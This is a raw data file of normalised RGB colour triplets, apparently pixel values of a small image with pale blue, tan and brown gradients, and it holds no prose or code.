{0.706,0.514,0.306},{0.761,0.576,0.298},{0.941,0.8,0.318},{0.996,0.894,0.337},{0.988,0.906,0.392},{0.969,0.871,0.345},{0.929,0.812,0.267},{0.878,0.714,0.141},{0.824,0.608,0.024},{0.933,0.969,1},{0.933,0.969,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.976,1},{0.945,0.973,1},{0.961,0.976,1},{0.965,0.98,0.996},{0.969,0.984,0.996},{0.969,0.984,1},{0.969,0.984,0.996},{0.973,0.988,1},{0.976,0.992,1},{0.976,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{0.996,0.996,0.996},{0.996,0.996,0.996},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,0.992},{0.953,0.937,0.914},{0.937,0.918,0.855},{0.937,0.925,0.847},{0.996,0.973,0.627},{1,0.98,0.592},{0.961,0.851,0.49},{0.898,0.749,0.733},{0.918,0.741,0.69},{0.91,0.733,0.659},
{0.886,0.706,0.62},{0.835,0.647,0.541},{0.843,0.643,0.518},{0.847,0.663,0.541},{0.851,0.682,0.565},{0.847,0.682,0.561},{0.843,0.675,0.565},{0.827,0.671,0.549},{0.82,0.663,0.545},{0.816,0.655,0.549},{0.808,0.635,0.525},{0.82,0.635,0.51},{0.808,0.612,0.475},{0.784,0.592,0.447},{0.776,0.576,0.435},{0.769,0.561,0.424},{0.745,0.537,0.384},{0.722,0.506,0.353},{0.698,0.482,0.329},{0.698,0.475,0.325},{0.678,0.439,0.29},{0.655,0.404,0.255},{0.639,0.388,0.235},{0.627,0.369,0.208},{0.6,0.345,0.173},{0.6,0.337,0.161},{0.576,0.318,0.122},{0.557,0.29,0.094},{0.541,0.251,0.067},{0.518,0.235,0.047},{0.514,0.231,0.043},{0.502,0.224,0.035},{0.49,0.208,0.039},{0.478,0.2,0.027},{0.502,0.224,0.035},{0.525,0.267,0.059},{0.565,0.322,0.098},{0.6,0.373,0.145},{0.6,0.388,0.157},{0.627,0.412,0.188},{0.643,0.439,0.231},{0.671,0.467,0.255},{0.686,0.498,0.278},{0.69,0.506,0.29},{0.698,0.514,0.302},{0.722,0.529,0.322},{0.718,0.529,0.322},{0.718,0.522,0.322},{0.718,0.525,0.322},{0.788,0.604,0.298},{0.961,0.827,0.325},{0.996,0.898,0.376},{0.992,0.894,0.376},
{0.973,0.871,0.345},{0.949,0.812,0.263},{0.871,0.702,0.133},{0.929,0.965,1},{0.929,0.965,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.941,0.98,0.992},{0.965,0.98,0.996},{0.969,0.98,1},{0.969,0.98,1},{0.969,0.984,1},{0.973,0.988,1},{0.98,0.996,1},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.988,0.992,1},{0.996,1,1},{1,1,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{0.992,1,0.996},{0.992,1,0.996},{0.996,1,1},{0.996,0.996,0.996},{0.996,0.996,0.996},{0.992,0.992,0.992},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,0.996},{0.949,0.941,0.89},{0.945,0.929,0.875},{0.937,0.929,0.831},{0.996,0.976,0.616},{0.992,0.961,0.506},{0.957,0.788,0.322},{0.898,0.753,0.725},{0.906,0.761,0.69},{0.89,0.737,0.655},{0.902,0.745,0.647},{0.859,0.706,0.596},{0.859,0.69,0.588},{0.878,0.714,0.608},{0.867,0.733,0.608},{0.871,0.718,0.608},
{0.863,0.71,0.596},{0.855,0.702,0.592},{0.843,0.686,0.576},{0.839,0.675,0.557},{0.835,0.671,0.545},{0.827,0.659,0.525},{0.8,0.616,0.486},{0.804,0.612,0.478},{0.78,0.576,0.435},{0.773,0.561,0.416},{0.749,0.529,0.38},{0.745,0.525,0.376},{0.718,0.502,0.341},{0.694,0.471,0.318},{0.686,0.443,0.298},{0.663,0.412,0.263},{0.643,0.388,0.239},{0.631,0.38,0.216},{0.6,0.341,0.169},{0.584,0.325,0.137},{0.58,0.322,0.133},{0.557,0.298,0.11},{0.533,0.275,0.086},{0.529,0.251,0.059},{0.514,0.231,0.043},{0.51,0.239,0.039},{0.498,0.227,0.031},{0.502,0.224,0.031},{0.529,0.251,0.063},{0.549,0.282,0.075},{0.588,0.341,0.125},{0.612,0.384,0.161},{0.62,0.408,0.196},{0.635,0.427,0.216},{0.659,0.459,0.243},{0.682,0.482,0.278},{0.686,0.525,0.31},{0.694,0.533,0.325},{0.71,0.545,0.337},{0.722,0.549,0.345},{0.718,0.541,0.341},{0.729,0.545,0.345},{0.725,0.541,0.337},{0.722,0.529,0.325},{0.8,0.624,0.29},{0.969,0.839,0.341},{1,0.898,0.361},{0.988,0.882,0.353},{0.973,0.867,0.329},{0.949,0.82,0.275},{0.929,0.965,1},{0.929,0.965,1},{0.937,0.973,1},
{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.941,0.98,0.992},{0.961,0.98,0.992},{0.965,0.976,0.996},{0.969,0.98,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.973,0.988,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.984,0.988,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.992,1,1},{0.996,1,1},{1,1,1},{1,1,1},{0.996,1,1},{0.992,1,0.996},{0.992,1,0.996},{0.992,1,0.996},{0.992,0.996,0.996},{0.992,0.992,0.992},{0.992,0.992,0.992},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,0.996},{0.929,0.922,0.871},{0.949,0.929,0.878},{0.945,0.937,0.824},{0.996,0.98,0.604},{0.996,0.91,0.357},{0.969,0.812,0.341},{0.886,0.761,0.714},{0.898,0.741,0.671},{0.89,0.741,0.655},{0.886,0.737,0.635},{0.886,0.741,0.639},{0.886,0.741,0.639},{0.894,0.753,0.643},{0.902,0.757,0.639},{0.894,0.749,0.643},{0.875,0.725,0.624},{0.871,0.714,0.608},{0.859,0.706,0.596},{0.859,0.706,0.6},{0.839,0.686,0.576},{0.82,0.651,0.529},
{0.808,0.627,0.506},{0.8,0.612,0.478},{0.776,0.573,0.427},{0.765,0.553,0.408},{0.757,0.537,0.384},{0.741,0.522,0.373},{0.71,0.494,0.329},{0.694,0.471,0.322},{0.682,0.443,0.294},{0.671,0.42,0.271},{0.647,0.396,0.247},{0.627,0.373,0.212},{0.608,0.345,0.173},{0.584,0.325,0.137},{0.573,0.314,0.125},{0.549,0.29,0.102},{0.537,0.278,0.09},{0.529,0.251,0.059},{0.514,0.235,0.047},{0.502,0.231,0.035},{0.51,0.239,0.043},{0.51,0.243,0.047},{0.541,0.275,0.082},{0.573,0.322,0.102},{0.6,0.361,0.145},{0.612,0.396,0.18},{0.624,0.42,0.216},{0.663,0.459,0.263},{0.682,0.498,0.294},{0.698,0.518,0.322},{0.718,0.541,0.341},{0.718,0.545,0.353},{0.725,0.553,0.361},{0.737,0.557,0.365},{0.733,0.553,0.361},{0.737,0.553,0.365},{0.737,0.549,0.357},{0.729,0.533,0.341},{0.722,0.525,0.322},{0.824,0.655,0.318},{0.973,0.855,0.345},{0.992,0.894,0.369},{0.988,0.894,0.357},{0.984,0.878,0.345},{0.929,0.957,1},{0.929,0.957,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.976,0.996},{0.957,0.973,1},{0.961,0.976,0.996},
{0.965,0.98,1},{0.969,0.984,1},{0.969,0.984,1},{0.973,0.988,1},{0.976,0.992,1},{0.98,0.992,0.996},{0.98,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,0.996},{0.992,1,0.996},{0.992,1,0.996},{0.992,1,0.996},{0.984,0.992,0.996},{0.976,0.988,0.988},{0.976,0.984,0.988},{0.988,0.992,0.996},{0.992,0.992,0.992},{0.996,0.996,0.992},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,0.996},{0.992,0.992,0.976},{0.918,0.91,0.867},{0.941,0.925,0.882},{0.929,0.914,0.8},{0.992,0.965,0.561},{0.992,0.847,0.22},{0.976,0.871,0.435},{0.89,0.765,0.729},{0.882,0.725,0.651},{0.882,0.733,0.655},{0.89,0.753,0.663},{0.902,0.769,0.671},{0.914,0.784,0.682},{0.922,0.788,0.682},{0.914,0.776,0.663},{0.91,0.769,0.655},{0.898,0.757,0.643},{0.89,0.749,0.635},{0.859,0.718,0.608},{0.847,0.702,0.6},{0.847,0.694,0.584},{0.816,0.655,0.545},{0.812,0.62,0.518},{0.808,0.612,0.486},{0.796,0.596,0.455},{0.773,0.565,0.42},{0.761,0.537,0.396},{0.737,0.522,0.369},
{0.725,0.51,0.353},{0.706,0.486,0.333},{0.678,0.443,0.294},{0.667,0.416,0.267},{0.655,0.404,0.255},{0.635,0.384,0.22},{0.612,0.345,0.173},{0.58,0.322,0.133},{0.58,0.322,0.133},{0.549,0.29,0.102},{0.537,0.278,0.09},{0.525,0.243,0.067},{0.514,0.231,0.051},{0.514,0.239,0.039},{0.529,0.255,0.059},{0.533,0.275,0.071},{0.569,0.318,0.106},{0.596,0.353,0.137},{0.627,0.396,0.184},{0.631,0.42,0.216},{0.647,0.451,0.251},{0.686,0.494,0.302},{0.694,0.522,0.322},{0.71,0.541,0.353},{0.725,0.545,0.365},{0.725,0.553,0.373},{0.729,0.557,0.376},{0.737,0.561,0.384},{0.737,0.549,0.376},{0.733,0.549,0.373},{0.729,0.545,0.369},{0.733,0.541,0.357},{0.729,0.537,0.349},{0.737,0.537,0.337},{0.831,0.671,0.322},{0.965,0.859,0.337},{0.992,0.906,0.38},{0.984,0.902,0.38},{0.925,0.949,0.996},{0.925,0.949,0.996},{0.933,0.969,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.976,1},{0.953,0.969,1},{0.961,0.976,0.996},{0.965,0.984,1},{0.969,0.98,1},{0.969,0.98,1},{0.973,0.988,1},{0.973,0.988,1},{0.976,0.992,1},
{0.976,0.992,1},{0.98,0.992,1},{0.98,0.996,1},{0.988,0.996,1},{0.988,0.996,1},{0.988,0.992,1},{0.98,0.984,0.988},{0.957,0.969,0.988},{0.945,0.961,0.988},{0.965,0.976,0.992},{0.976,0.988,0.996},{0.992,0.996,1},{0.992,0.996,0.996},{0.988,0.992,0.992},{0.988,0.992,0.988},{0.984,0.988,0.988},{0.988,0.988,0.988},{0.984,0.992,0.988},{0.984,0.996,0.988},{0.973,0.98,0.965},{0.922,0.914,0.894},{0.914,0.894,0.855},{0.941,0.91,0.773},{0.996,0.941,0.467},{0.984,0.843,0.184},{0.98,0.918,0.518},{0.902,0.804,0.784},{0.882,0.749,0.686},{0.894,0.753,0.678},{0.902,0.773,0.69},{0.925,0.796,0.714},{0.922,0.796,0.702},{0.937,0.804,0.698},{0.918,0.78,0.675},{0.918,0.78,0.671},{0.902,0.765,0.655},{0.894,0.757,0.647},{0.882,0.745,0.639},{0.855,0.71,0.604},{0.851,0.698,0.588},{0.827,0.663,0.561},{0.824,0.631,0.533},{0.831,0.635,0.514},{0.796,0.6,0.463},{0.788,0.584,0.439},{0.769,0.553,0.408},{0.741,0.525,0.373},{0.722,0.506,0.353},{0.706,0.482,0.333},{0.686,0.447,0.298},{0.667,0.416,0.267},{0.663,0.412,0.263},{0.631,0.38,0.216},
{0.604,0.341,0.165},{0.592,0.333,0.145},{0.576,0.318,0.129},{0.561,0.302,0.114},{0.537,0.278,0.09},{0.525,0.239,0.071},{0.514,0.231,0.063},{0.529,0.255,0.051},{0.537,0.263,0.059},{0.553,0.306,0.094},{0.58,0.349,0.133},{0.624,0.388,0.184},{0.643,0.424,0.231},{0.667,0.459,0.267},{0.671,0.475,0.286},{0.69,0.506,0.318},{0.702,0.529,0.337},{0.714,0.545,0.365},{0.725,0.553,0.376},{0.737,0.565,0.388},{0.741,0.569,0.392},{0.741,0.569,0.392},{0.745,0.557,0.384},{0.745,0.557,0.388},{0.749,0.565,0.4},{0.741,0.553,0.376},{0.737,0.549,0.369},{0.749,0.549,0.365},{0.737,0.545,0.337},{0.847,0.686,0.318},{0.98,0.875,0.333},{0.992,0.906,0.384},{0.929,0.953,1},{0.929,0.953,1},{0.933,0.969,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.976,1},{0.949,0.969,1},{0.957,0.976,0.996},{0.961,0.984,1},{0.969,0.984,1},{0.969,0.984,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.957,0.973,0.992},{0.957,0.973,0.988},{0.949,0.973,0.984},{0.953,0.976,0.992},{0.973,0.984,0.996},{0.98,0.984,1},{0.965,0.969,0.965},
{0.914,0.918,0.886},{0.906,0.918,0.918},{0.925,0.937,0.961},{0.925,0.949,0.973},{0.925,0.949,0.976},{0.937,0.957,0.976},{0.957,0.973,0.984},{0.961,0.98,0.984},{0.973,0.988,0.984},{0.98,0.988,0.98},{0.965,0.965,0.957},{0.949,0.937,0.918},{0.918,0.902,0.859},{0.886,0.863,0.812},{0.894,0.851,0.788},{0.906,0.855,0.788},{0.918,0.867,0.698},{0.996,0.894,0.38},{0.984,0.863,0.239},{0.953,0.886,0.498},{0.918,0.812,0.784},{0.918,0.788,0.733},{0.922,0.796,0.733},{0.922,0.808,0.737},{0.929,0.816,0.741},{0.925,0.808,0.718},{0.929,0.8,0.698},{0.922,0.788,0.686},{0.914,0.776,0.675},{0.91,0.773,0.671},{0.894,0.753,0.651},{0.882,0.741,0.639},{0.871,0.725,0.62},{0.855,0.698,0.588},{0.839,0.671,0.565},{0.839,0.647,0.549},{0.824,0.627,0.51},{0.812,0.616,0.482},{0.792,0.6,0.455},{0.769,0.561,0.42},{0.741,0.525,0.373},{0.725,0.506,0.353},{0.706,0.467,0.322},{0.682,0.431,0.29},{0.675,0.424,0.275},{0.655,0.404,0.255},{0.635,0.384,0.224},{0.608,0.349,0.176},{0.592,0.333,0.145},{0.58,0.322,0.133},{0.557,0.298,0.11},{0.529,0.271,0.086},{0.522,0.235,0.067},
{0.522,0.239,0.071},{0.537,0.263,0.063},{0.565,0.294,0.09},{0.584,0.341,0.141},{0.62,0.396,0.192},{0.651,0.435,0.235},{0.667,0.459,0.267},{0.671,0.471,0.294},{0.675,0.498,0.318},{0.698,0.514,0.341},{0.698,0.529,0.353},{0.714,0.541,0.365},{0.729,0.557,0.384},{0.733,0.561,0.384},{0.741,0.569,0.392},{0.741,0.569,0.392},{0.737,0.549,0.376},{0.749,0.561,0.392},{0.745,0.561,0.392},{0.741,0.553,0.376},{0.741,0.549,0.373},{0.741,0.553,0.369},{0.741,0.537,0.357},{0.757,0.553,0.325},{0.918,0.769,0.341},{0.98,0.886,0.333},{0.929,0.969,1},{0.929,0.969,1},{0.925,0.949,0.996},{0.929,0.961,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.941,0.973,0.992},{0.949,0.98,1},{0.949,0.98,0.996},{0.941,0.973,0.996},{0.941,0.965,0.984},{0.937,0.945,0.941},{0.929,0.937,0.922},{0.933,0.929,0.902},{0.933,0.937,0.89},{0.937,0.941,0.91},{0.933,0.933,0.902},{0.929,0.918,0.878},{0.886,0.859,0.78},{0.871,0.835,0.757},{0.875,0.859,0.816},{0.886,0.878,0.851},{0.886,0.882,0.875},{0.902,0.894,0.878},{0.925,0.914,0.878},
{0.929,0.914,0.875},{0.933,0.91,0.871},{0.922,0.898,0.827},{0.906,0.875,0.784},{0.898,0.847,0.757},{0.89,0.824,0.733},{0.859,0.808,0.706},{0.867,0.82,0.741},{0.867,0.816,0.745},{0.875,0.824,0.749},{0.886,0.831,0.725},{0.984,0.871,0.333},{0.988,0.894,0.322},{0.851,0.706,0.325},{0.918,0.8,0.769},{0.918,0.796,0.757},{0.922,0.808,0.749},{0.929,0.812,0.745},{0.929,0.816,0.753},{0.929,0.816,0.749},{0.933,0.812,0.733},{0.922,0.792,0.694},{0.918,0.788,0.69},{0.91,0.776,0.678},{0.906,0.773,0.667},{0.894,0.761,0.655},{0.867,0.725,0.612},{0.859,0.702,0.592},{0.847,0.678,0.565},{0.824,0.647,0.533},{0.827,0.643,0.522},{0.82,0.62,0.51},{0.804,0.608,0.486},{0.78,0.569,0.439},{0.749,0.525,0.384},{0.733,0.51,0.357},{0.714,0.463,0.322},{0.682,0.431,0.286},{0.667,0.42,0.267},{0.651,0.404,0.251},{0.631,0.384,0.22},{0.612,0.361,0.184},{0.584,0.322,0.145},{0.573,0.31,0.133},{0.553,0.29,0.114},{0.533,0.271,0.094},{0.525,0.247,0.075},{0.525,0.247,0.075},{0.545,0.271,0.075},{0.588,0.329,0.125},{0.624,0.384,0.184},{0.659,0.431,0.243},{0.651,0.463,0.259},
{0.663,0.475,0.282},{0.675,0.482,0.314},{0.682,0.506,0.333},{0.702,0.533,0.357},{0.71,0.541,0.365},{0.722,0.549,0.38},{0.729,0.557,0.388},{0.733,0.565,0.388},{0.741,0.573,0.396},{0.737,0.573,0.392},{0.737,0.561,0.384},{0.757,0.573,0.408},{0.753,0.569,0.4},{0.741,0.545,0.373},{0.737,0.537,0.369},{0.757,0.561,0.388},{0.737,0.545,0.357},{0.733,0.541,0.345},{0.776,0.596,0.31},{0.949,0.824,0.302},{0.925,0.965,1},{0.925,0.965,1},{0.925,0.949,0.996},{0.929,0.961,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.925,0.961,0.988},{0.922,0.929,0.937},{0.894,0.898,0.882},{0.898,0.894,0.847},{0.914,0.886,0.824},{0.914,0.871,0.8},{0.91,0.863,0.769},{0.91,0.863,0.749},{0.918,0.863,0.729},{0.898,0.827,0.675},{0.882,0.808,0.663},{0.855,0.776,0.643},{0.875,0.808,0.682},{0.827,0.769,0.643},{0.812,0.753,0.643},{0.835,0.769,0.655},{0.863,0.773,0.643},{0.871,0.776,0.643},{0.882,0.788,0.635},{0.878,0.78,0.62},{0.867,0.769,0.612},{0.859,0.765,0.627},{0.835,0.761,0.651},
{0.835,0.776,0.694},{0.82,0.773,0.698},{0.831,0.796,0.729},{0.835,0.804,0.741},{0.871,0.827,0.792},{0.941,0.82,0.369},{0.988,0.894,0.376},{0.753,0.494,0.208},{0.906,0.776,0.737},{0.925,0.808,0.761},{0.925,0.808,0.753},{0.933,0.816,0.749},{0.918,0.804,0.741},{0.925,0.812,0.741},{0.933,0.812,0.729},{0.929,0.796,0.702},{0.922,0.788,0.69},{0.918,0.784,0.686},{0.898,0.765,0.659},{0.89,0.761,0.655},{0.875,0.745,0.639},{0.863,0.722,0.616},{0.847,0.69,0.573},{0.835,0.667,0.549},{0.824,0.639,0.522},{0.82,0.62,0.506},{0.8,0.604,0.482},{0.78,0.576,0.443},{0.749,0.541,0.396},{0.722,0.514,0.353},{0.714,0.478,0.333},{0.678,0.447,0.298},{0.659,0.427,0.275},{0.647,0.416,0.259},{0.631,0.384,0.22},{0.604,0.349,0.176},{0.584,0.322,0.145},{0.573,0.31,0.133},{0.553,0.29,0.114},{0.529,0.271,0.094},{0.537,0.259,0.086},{0.545,0.271,0.098},{0.565,0.302,0.114},{0.604,0.357,0.161},{0.631,0.404,0.2},{0.655,0.447,0.251},{0.659,0.471,0.275},{0.667,0.478,0.298},{0.675,0.482,0.314},{0.686,0.51,0.337},{0.702,0.533,0.357},{0.71,0.541,0.365},{0.714,0.545,0.376},
{0.718,0.549,0.38},{0.725,0.557,0.38},{0.741,0.573,0.396},{0.737,0.573,0.392},{0.741,0.565,0.392},{0.745,0.561,0.392},{0.741,0.557,0.388},{0.737,0.541,0.373},{0.733,0.533,0.365},{0.741,0.537,0.369},{0.745,0.537,0.357},{0.745,0.545,0.353},{0.733,0.533,0.341},{0.824,0.655,0.322},{0.918,0.965,1},{0.918,0.965,1},{0.925,0.965,1},{0.929,0.965,1},{0.933,0.969,1},{0.937,0.973,1},{0.941,0.973,0.996},{0.941,0.973,0.996},{0.929,0.976,1},{0.914,0.941,0.961},{0.875,0.89,0.886},{0.847,0.82,0.792},{0.847,0.82,0.769},{0.851,0.835,0.765},{0.859,0.824,0.722},{0.859,0.792,0.686},{0.867,0.792,0.678},{0.875,0.804,0.659},{0.847,0.769,0.612},{0.855,0.773,0.6},{0.824,0.729,0.561},{0.847,0.737,0.557},{0.776,0.643,0.435},{0.655,0.518,0.325},{0.616,0.467,0.282},{0.635,0.486,0.294},{0.686,0.549,0.361},{0.749,0.624,0.471},{0.816,0.706,0.584},{0.824,0.733,0.624},{0.839,0.757,0.663},{0.827,0.773,0.706},{0.827,0.792,0.757},{0.839,0.812,0.78},{0.824,0.812,0.765},{0.851,0.82,0.78},{0.835,0.8,0.769},{0.812,0.773,0.71},{0.871,0.773,0.498},
{0.941,0.82,0.337},{0.749,0.486,0.263},{0.882,0.753,0.678},{0.925,0.804,0.753},{0.922,0.808,0.753},{0.929,0.816,0.753},{0.918,0.808,0.737},{0.929,0.812,0.733},{0.933,0.808,0.714},{0.922,0.8,0.706},{0.914,0.796,0.706},{0.902,0.784,0.694},{0.902,0.78,0.682},{0.894,0.765,0.659},{0.882,0.761,0.647},{0.871,0.737,0.624},{0.859,0.71,0.596},{0.824,0.667,0.561},{0.824,0.643,0.529},{0.804,0.616,0.494},{0.784,0.596,0.463},{0.769,0.565,0.431},{0.749,0.541,0.396},{0.725,0.518,0.369},{0.698,0.478,0.329},{0.671,0.451,0.298},{0.663,0.435,0.271},{0.647,0.416,0.251},{0.627,0.376,0.208},{0.6,0.349,0.169},{0.588,0.325,0.149},{0.565,0.302,0.125},{0.549,0.286,0.11},{0.529,0.267,0.09},{0.529,0.267,0.082},{0.549,0.294,0.11},{0.573,0.329,0.129},{0.608,0.376,0.18},{0.643,0.427,0.227},{0.655,0.451,0.263},{0.655,0.467,0.294},{0.667,0.482,0.314},{0.678,0.498,0.325},{0.698,0.522,0.345},{0.694,0.525,0.353},{0.698,0.529,0.357},{0.71,0.537,0.369},{0.722,0.549,0.38},{0.733,0.561,0.392},{0.741,0.569,0.4},{0.745,0.573,0.404},{0.745,0.565,0.396},{0.753,0.569,0.404},
{0.749,0.565,0.396},{0.749,0.561,0.396},{0.741,0.553,0.384},{0.729,0.537,0.369},{0.741,0.541,0.369},{0.745,0.545,0.349},{0.718,0.518,0.322},{0.729,0.533,0.322},{0.914,0.969,1},{0.914,0.969,1},{0.925,0.965,1},{0.925,0.965,1},{0.929,0.965,1},{0.937,0.973,1},{0.941,0.973,1},{0.937,0.973,0.988},{0.898,0.914,0.937},{0.847,0.827,0.788},{0.808,0.757,0.675},{0.812,0.757,0.694},{0.804,0.733,0.639},{0.749,0.655,0.514},{0.706,0.608,0.427},{0.749,0.651,0.471},{0.788,0.682,0.494},{0.808,0.702,0.506},{0.812,0.698,0.514},{0.8,0.686,0.494},{0.82,0.698,0.486},{0.706,0.553,0.314},{0.506,0.329,0.137},{0.404,0.22,0.047},{0.467,0.275,0.075},{0.525,0.329,0.118},{0.573,0.396,0.2},{0.639,0.498,0.341},{0.729,0.62,0.498},{0.796,0.71,0.612},{0.82,0.753,0.682},{0.827,0.773,0.725},{0.816,0.776,0.733},{0.8,0.773,0.718},{0.796,0.773,0.718},{0.792,0.769,0.71},{0.804,0.773,0.722},{0.792,0.769,0.714},{0.796,0.753,0.639},{0.824,0.671,0.337},{0.827,0.647,0.502},{0.871,0.725,0.651},{0.914,0.792,0.745},{0.918,0.804,0.749},{0.925,0.812,0.757},
{0.914,0.804,0.741},{0.929,0.82,0.749},{0.929,0.816,0.729},{0.925,0.812,0.725},{0.914,0.804,0.718},{0.902,0.792,0.706},{0.91,0.788,0.698},{0.91,0.776,0.675},{0.894,0.761,0.651},{0.871,0.729,0.62},{0.867,0.714,0.604},{0.835,0.678,0.576},{0.843,0.663,0.553},{0.804,0.616,0.49},{0.788,0.604,0.463},{0.773,0.576,0.439},{0.745,0.533,0.392},{0.718,0.506,0.365},{0.706,0.49,0.337},{0.686,0.467,0.314},{0.667,0.427,0.267},{0.647,0.404,0.243},{0.616,0.361,0.192},{0.592,0.341,0.153},{0.573,0.31,0.133},{0.545,0.282,0.106},{0.533,0.271,0.094},{0.525,0.263,0.086},{0.537,0.282,0.094},{0.561,0.314,0.122},{0.588,0.357,0.153},{0.616,0.396,0.204},{0.639,0.435,0.231},{0.647,0.455,0.267},{0.655,0.471,0.302},{0.667,0.482,0.318},{0.682,0.506,0.333},{0.69,0.518,0.341},{0.698,0.529,0.361},{0.706,0.537,0.369},{0.706,0.533,0.365},{0.725,0.549,0.384},{0.725,0.553,0.388},{0.733,0.557,0.392},{0.737,0.565,0.4},{0.745,0.565,0.4},{0.749,0.565,0.4},{0.749,0.565,0.396},{0.745,0.561,0.388},{0.745,0.561,0.388},{0.741,0.553,0.38},{0.741,0.549,0.38},{0.741,0.537,0.357},
{0.741,0.533,0.345},{0.741,0.533,0.349},{0.91,0.961,1},{0.91,0.961,1},{0.929,0.969,0.996},{0.925,0.973,0.996},{0.929,0.969,1},{0.933,0.969,1},{0.933,0.965,0.996},{0.906,0.937,0.933},{0.824,0.812,0.745},{0.71,0.639,0.553},{0.706,0.647,0.592},{0.729,0.659,0.569},{0.647,0.518,0.349},{0.616,0.463,0.267},{0.631,0.471,0.267},{0.612,0.475,0.263},{0.608,0.467,0.251},{0.655,0.514,0.314},{0.702,0.553,0.361},{0.714,0.565,0.357},{0.686,0.522,0.302},{0.506,0.353,0.141},{0.416,0.259,0.125},{0.337,0.161,0.051},{0.439,0.231,0.047},{0.506,0.306,0.098},{0.584,0.404,0.224},{0.627,0.475,0.31},{0.647,0.498,0.302},{0.663,0.525,0.361},{0.675,0.569,0.412},{0.722,0.604,0.435},{0.729,0.604,0.431},{0.733,0.612,0.451},{0.749,0.639,0.498},{0.745,0.651,0.514},{0.722,0.639,0.51},{0.706,0.612,0.459},{0.675,0.569,0.42},{0.722,0.635,0.498},{0.722,0.588,0.49},{0.769,0.624,0.549},{0.91,0.78,0.725},{0.925,0.808,0.753},{0.922,0.808,0.761},{0.918,0.804,0.753},{0.929,0.82,0.753},{0.929,0.82,0.737},{0.918,0.808,0.725},{0.922,0.812,0.725},{0.914,0.804,0.714},
{0.922,0.8,0.706},{0.918,0.78,0.678},{0.902,0.757,0.651},{0.89,0.745,0.643},{0.878,0.729,0.624},{0.863,0.702,0.596},{0.843,0.663,0.557},{0.82,0.631,0.514},{0.796,0.608,0.471},{0.78,0.576,0.443},{0.761,0.549,0.404},{0.725,0.51,0.365},{0.71,0.494,0.341},{0.682,0.459,0.306},{0.671,0.431,0.271},{0.647,0.408,0.239},{0.612,0.357,0.188},{0.58,0.329,0.149},{0.557,0.294,0.125},{0.541,0.275,0.106},{0.522,0.259,0.09},{0.533,0.267,0.094},{0.541,0.286,0.098},{0.576,0.329,0.141},{0.6,0.38,0.184},{0.631,0.427,0.235},{0.639,0.447,0.243},{0.655,0.471,0.278},{0.667,0.482,0.314},{0.675,0.49,0.325},{0.686,0.514,0.341},{0.698,0.525,0.353},{0.706,0.541,0.369},{0.706,0.541,0.373},{0.718,0.545,0.376},{0.725,0.553,0.384},{0.729,0.557,0.392},{0.741,0.569,0.404},{0.749,0.576,0.412},{0.757,0.576,0.412},{0.753,0.569,0.404},{0.749,0.561,0.396},{0.745,0.565,0.388},{0.741,0.557,0.384},{0.741,0.553,0.38},{0.737,0.545,0.376},{0.745,0.541,0.369},{0.741,0.537,0.357},{0.741,0.537,0.349},{0.906,0.953,1},{0.906,0.953,1},{0.914,0.969,0.996},{0.929,0.969,0.996},
{0.922,0.976,0.992},{0.925,0.965,0.988},{0.898,0.941,0.953},{0.792,0.773,0.722},{0.627,0.565,0.478},{0.545,0.439,0.333},{0.557,0.443,0.325},{0.49,0.318,0.165},{0.455,0.282,0.133},{0.392,0.243,0.094},{0.325,0.2,0.078},{0.263,0.149,0.043},{0.259,0.145,0.043},{0.271,0.149,0.063},{0.247,0.118,0.043},{0.255,0.137,0.051},{0.31,0.188,0.082},{0.373,0.235,0.11},{0.392,0.22,0.094},{0.353,0.169,0.067},{0.369,0.169,0.055},{0.427,0.22,0.063},{0.498,0.294,0.082},{0.506,0.294,0.063},{0.553,0.341,0.082},{0.604,0.412,0.176},{0.635,0.49,0.322},{0.631,0.482,0.302},{0.62,0.463,0.275},{0.616,0.463,0.271},{0.62,0.471,0.267},{0.612,0.459,0.263},{0.6,0.443,0.263},{0.537,0.38,0.208},{0.459,0.314,0.169},{0.749,0.698,0.62},{0.745,0.71,0.631},{0.788,0.733,0.675},{0.894,0.776,0.702},{0.918,0.796,0.733},{0.914,0.804,0.753},{0.922,0.808,0.753},{0.937,0.824,0.749},{0.933,0.82,0.737},{0.922,0.808,0.725},{0.929,0.82,0.733},{0.918,0.804,0.71},{0.925,0.808,0.71},{0.922,0.788,0.69},{0.906,0.765,0.663},{0.898,0.745,0.647},{0.875,0.718,0.616},{0.863,0.686,0.588},
